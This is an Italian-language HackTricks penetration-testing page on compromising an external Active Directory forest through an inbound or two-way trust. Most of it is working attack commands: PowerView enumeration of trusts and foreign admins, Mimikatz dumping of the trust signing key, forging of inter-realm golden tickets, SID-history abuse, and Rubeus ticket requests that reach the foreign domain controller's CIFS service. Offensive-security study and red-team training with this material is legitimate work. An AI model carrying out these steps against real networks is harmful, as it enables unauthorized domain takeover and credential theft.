# Dominio Forestale Esterno - OneWay (In entrata) o bidirezionale

{{#include ../../banners/hacktricks-training.md}}

In questo scenario, un dominio esterno si fida di te (o entrambi si fidano l'uno dell'altro), quindi puoi ottenere un certo tipo di accesso su di esso.

## Enumerazione

Prima di tutto, devi **enumerare** la **fiducia**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Nella precedente enumerazione è stato trovato che l'utente **`crossuser`** è all'interno del gruppo **`External Admins`** che ha **accesso Admin** all'interno del **DC del dominio esterno**.

## Accesso Iniziale

Se non **sei riuscito** a trovare alcun accesso **speciale** del tuo utente nell'altro dominio, puoi comunque tornare alla metodologia AD e provare a **privesc da un utente non privilegiato** (cose come kerberoasting, per esempio):

Puoi utilizzare le **funzioni di Powerview** per **enumerare** l'**altro dominio** usando il parametro `-Domain` come in:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonificazione

### Accesso

Utilizzando un metodo regolare con le credenziali degli utenti che hanno accesso al dominio esterno, dovresti essere in grado di accedere a:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abuso della Storia SID

Puoi anche abusare della [**Storia SID**](sid-history-injection.md) attraverso un trust di foresta.

Se un utente viene **migrato da una foresta a un'altra** e **il filtro SID non è abilitato**, diventa possibile **aggiungere un SID dall'altra foresta**, e questo **SID** sarà **aggiunto** al **token dell'utente** durante l'autenticazione **attraverso il trust**.

> [!WARNING]
> Come promemoria, puoi ottenere la chiave di firma con
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Puoi **firmare con** la chiave **fidata** un **TGT impersonando** l'utente del dominio attuale.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Metodo completo per impersonare l'utente
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
